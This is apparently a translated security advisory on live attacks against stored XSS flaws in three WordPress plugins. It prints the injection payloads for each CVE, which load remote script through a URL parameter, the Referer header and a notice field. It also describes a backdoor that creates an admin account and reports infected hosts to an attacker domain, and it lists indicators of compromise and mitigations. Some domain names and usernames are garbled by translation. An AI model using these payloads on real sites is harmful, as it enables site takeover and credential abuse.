#  主动利用WordPress插件中未经认证的存储XSS漏洞   
HackSee安全团队  HackSee   2024-06-01 17:23  
  
我们观察到针对CVE-2024-2194、CVE-2023-6961和CVE-2023-40000这三种高级别cve的主动攻击尝试。这些漏洞存在于各种WordPress插件中，由于输入清理和输出转义不足，容易受到未经身份验证的存储跨站点脚本(XSS)攻击，使攻击者有可能注入恶意脚本。  
  
我们观察到的针对这些漏洞的攻击载荷注入了一个脚本标签，该标签指向托管在外部域上的一个混淆的JavaScript文件。用于针对这些漏洞的脚本是相同的，专注于以下恶意操作:  
1. 创建新的管理员帐户  
  
1. 注入后门  
  
1. 设置跟踪脚本，大概是为了监控受感染的站点  
  
我们已经看到大量的攻击企图来自与自治系统(AS) IP Volume Inc相关的IP地址，其地理位置集中在荷兰。此外，我们已经确定了攻击有效载荷中引用的五个域。在最后的跟踪阶段使用了另外两个域名，它们与之前利用WordPress插件的活动(1和2)相关联。  
## 漏洞细节  
  
cve - 2024 - 2194  
  
WP Statistics插件(14.5及更早版本)通过URL搜索参数暴露给存储的跨站点脚本。  
```
utm_id="><script src="https://{CALLBACK_DOMAIN}/"></script>
```  
  
此漏洞允许未经身份验证的攻击者通过URL搜索参数注入任意web脚本。每当用户访问注入的页面时，就会执行这些脚本。攻击者反复发送包含此有效负载的请求，以确保它出现在访问最多的页面上，并向这些请求添加“utm_id”参数。  
  
该漏洞于2024年3月11日由蒂姆·科恩(Tim Coen)披露。WP统计插件有超过60万的活跃安装。统计数据显示，低于14.5的版本在使用该插件的所有网站中仍有48%保持活跃。  
  
cve - 2023 - 6961  
  
WP Meta SEO插件(版本4.5.12及更早)容易受到通过Referer HTTP头存储的跨站点脚本攻击。  
```
Referer: <script src="https://{CALLBACK_DOMAIN}/"></script>
```  
  
  
攻击者将此有效负载发送到目标站点，特别是发送到生成404响应的页面。WP Meta SEO插件将这个未消毒的标题插入到数据库中以跟踪重定向。当管理员加载404和重定向页面时，该脚本从回调域中提取混淆的JavaScript，并在受害者的浏览器中执行。如果受害者已通过身份验证(例如，WP管理员已登录)，则他们的凭据将被利用以进行后续恶意操作。  
  
该漏洞于2024年4月16日由CERT PL的研究员Krzysztof Zając披露。WP Meta SEO插件的活跃安装量超过2万。统计数据显示，低于4.5的版本在使用插件的所有网站中仍有27%保持活跃。  
  
cve - 2023 - 40000  
  
WordPress的LiteSpeed缓存插件(版本5.7.0.1及更早)容易受到通过'nameservers'和'_msg'参数存储的跨站点脚本的攻击。  
```
result[_msg]=<script src="https://{CALLBACK_DOMAIN}/"></script>
```  
  
当管理员访问任何后端页面时，就会触发XSS漏洞，因为XSS有效负载伪装成管理通知，导致恶意脚本使用其凭据执行后续恶意操作。  
  
这个漏洞是由Patchstack在2024年2月披露的。LiteSpeed缓存插件被广泛使用，有超过500万的活跃安装。统计数据显示，低于5.7的版本在15.7%的使用该插件的网站上仍然有效，这表明有相当多的网站处于危险之中。  
## JavaScript的恶意软件  
  
恶意JavaScript的内容执行以下操作:  
1. 注入恶意PHP后门:  
  
1. 到插件文件中  
  
1. 放入主题文件  
  
1. 创建一个新的管理员帐户:  
  
1. 向服务器的WordPress安装发送一个请求，以创建一个新的管理员帐户  
  
1. 启动跟踪  
  
1. 通过Yandex实现跟踪，无论是通过JavaScript还是跟踪像素  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/M8pOVgDSPVJlxvd0F3dOYK4JKiacoczKcPdSnXe0axOxkZkSfzPvjoD3u03ibl0SZRLc3VvfzQJQsDFe464MaMeA/640?wx_fmt=png&from=appmsg "")  
  
  
图1:恶意JavaScript有效负载的摘录  
  
  
恶意PHP执行以下操作:  
1. 注入跟踪脚本:  
  
1. 递归地搜索wp-load .php，并在wp-config.php中注入以下内容:  
  
```
<script src="https://{TRACKING_DOMAIN}/"></script>
```  
1. 创建一个新的WordPress admin用户  
  
1. 用户名：admim  
  
1. 密码:7 f9szcns6g3aflao39ro  
  
1. 电子邮件：admim@mystiqueapi[.]通讯  
  
1. 追踪受感染的主机  
  
1. 发送一个GET请求到:  
  
```
hxxp://ur.mystiqueapi[.]com/?ur=<$_SERVER['HTTP_HOST']>
```  
- 这通过捕获其HTTP主机信息来跟踪受感染的主机。  
  
## 威胁行为者活动  
  
cve - 2024 - 2194  
  
  
  
  
图2:CVE-2024-2194攻击活动  
  
  
域媒体。cdnstaticjs[。com与利用CVE-2024-2194有关。我们观察到针对此漏洞的攻击来自17个不同的IP地址，主要来自AS202425 (IP Volume Inc.)和AS210848 (Telkom Internet LTD .)，攻击集中来自荷兰。  
  
cve - 2023 - 6961  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/M8pOVgDSPVJlxvd0F3dOYK4JKiacoczKcJKX1OqAD1jHiaZNPNmK16TWlWDOXbTKVQXnDDT3iaicf4T1lB2BmMNiazQ/640?wx_fmt=png&from=appmsg "")  
  
  
图3:CVE-2023-6961攻击活动  
  
  
域idc.cloudiync[。com与CVE-2023-6961漏洞的利用有关。到目前为止，已经有超过50亿的请求试图利用这个漏洞从一个IP地址，这源自自治系统AS202425 (IP Volume Inc.)。此外，自5月16日以来，我们已经观察到media.cdnstaticjs[。com被用于针对此漏洞的攻击载荷。此域也用于针对CVE-2024-2194的攻击。  
  
cve - 2023 - 40000  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/M8pOVgDSPVJlxvd0F3dOYK4JKiacoczKcttfGZ0u2bVA6T3QgTFxsmz9pQHjRSSmicFLnI0EkEdT4hwicJ8MI3ffw/640?wx_fmt=png&from=appmsg "")  
  
  
图4:CVE-2023-40000攻击活动  
  
  
域cloud.cdndynamic[。com, go.kcloudinc[。[.]com和cdn.mediajsdelivery[.]com与CVE-2023-40000漏洞的利用有关。最后观察到的攻击使用域cd .mediajsdelivery[。在4月15日。从那以后，我们只看到cloud.cdndynamic[。com和go.kcloudinc[.]com被用于针对此漏洞的攻击。  
  
与前两个漏洞不同，利用CVE-2023-40000的攻击更多地分布在不同的IP地址和自治系统(AS)上。我们观察到来自1664个不同IP地址的攻击，主要来自AS210848 (Telkom Internet LTD .)和AS202425 (IP Volume Inc.)，攻击主要集中在荷兰。  
### 跟踪领域  
  
域资产。scontentflow[。com是在CVE-2023-6961公开发布后不久注册的，这是idc.cloudiync[.]com的有效负载写入受感染站点的主要域名。根据我们的搜索，包含此有效负载的网页很少，这表明迄今为止该有效负载的感染成功有限。  
  
域名cache.cloudswiftcdn。com是在所有三个cve公开发布之前注册的。引用此域的有效负载与其他观察到的有效负载的结构相似，但增加了40多个额外的主题来尝试后门。根据PublicWWW上的搜索，有超过3000页包含这个脚本。这与较早的注册时间相结合，可能表明使用或感染时间较长。  
## 危害指标(ioc)  
### 域  
  
以下域与针对这些漏洞的利用尝试相关联。  
```
media.cdnstaticjs[.]comcloud.cdndynamic[.]comidc.cloudiync[.]comcdn.mediajsdelivery[.]comgo.kcloudinc[.]comassets.scontentflow[.]comcache.cloudswiftcdn[.]com
```  
### IP地址  
  
以下IP地址与针对这些漏洞的利用尝试相关联。请注意，这个列表并不详尽。  
```
80.82.76[.]21431.43.191[.]22094.102.51[.]14494.102.51[.]9591.223.82[.]150185.7.33[.]129101.99.75[.]17894.242.61[.]21780.82.78[.]133111.90.150[.]154103.155.93[.]120185.100.87[.]144185.162.130[.]23101.99.75[.]215111.90.150[.]123103.155.93[.]244185.209.162[.]247179.43.172[.]148185.159.82[.]103185.247.226[.]37185.165.169[.]62
```  
## 缓解指导  
  
检查已安装的插件，应用任何可用的更新，并删除与可疑插件相关的文件夹。  
  
要小心拥有管理员权限的用户。具体来说，要注意用户名为admin，电子邮件为admin [@]mystiqueapi[.]com的用户。  
  
检查所有文件的意外修改，特别是如果它们包含可疑的脚本。查找以下注入代码:  
```
<script src="hxxps://assets.scontentflow[.]com"</script>
<script src="hxxps://cache.cloudswiftcdn[.]com"</script>
```  
  
寻找任何意外的出站请求，特别是那些导致Yandex跟踪链接或http://ur.mystiqueapi[.]com/?ur。  
  
如果您看到任何这些指标的证据，您的网站已经通过利用这些漏洞之一的目标。  
  
  
  
